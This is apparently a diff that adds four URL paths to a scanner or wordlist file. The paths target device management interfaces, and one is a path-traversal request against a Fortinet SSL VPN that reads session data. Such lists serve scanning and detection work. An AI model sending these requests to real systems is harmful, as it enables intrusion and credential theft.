@@ -1,0 +1,4 @@
+/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession
+/configWizard/keyUpload.jsp
+/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile={{url_encode(progressfile)}}
+/login?redir=/ng
